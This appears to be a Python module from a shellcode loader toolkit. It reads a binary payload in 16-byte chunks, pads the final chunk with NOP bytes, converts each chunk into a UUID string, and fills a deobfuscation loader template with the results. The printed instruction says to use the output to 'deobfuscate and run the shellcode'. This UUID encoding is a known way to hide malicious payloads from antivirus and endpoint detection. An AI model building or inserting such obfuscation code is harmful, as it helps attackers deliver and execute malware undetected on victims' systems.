from uuid import UUID
import sys
sys.path.append('..')
from Encoder.LoaderStrings import uuid_deobfuscation_code

def generate_uuid_output(file_path, L):
    global uuid_deobfuscation_code

    uuid_list = []
    with open(file_path, "rb") as f:
        chunk = f.read(16)
        while chunk:
            if len(chunk) < 16:
                padding = 16 - len(chunk)
                chunk = chunk + (b"\x90" * padding)
                uuid_list.append(str(UUID(bytes_le=chunk)))
                break
            uuid_list.append(str(UUID(bytes_le=chunk)))
            chunk = f.read(16)

    # Update uuid_deobfuscation_code with the generated UUID strings
    uuid_deobfuscation_code = uuid_deobfuscation_code.replace("// Replace this with the output of generate_uuid_output function", "\n".join([f'        "{uuid}",' for uuid in uuid_list]))

    if L==1:
            print("\n\n###### USE THE FOLLOWING CODE TO DEOBFUSCATE AND RUN THE SHELLCODE ######\n\n")
            print(uuid_deobfuscation_code)
    else:
            print(uuid_list)
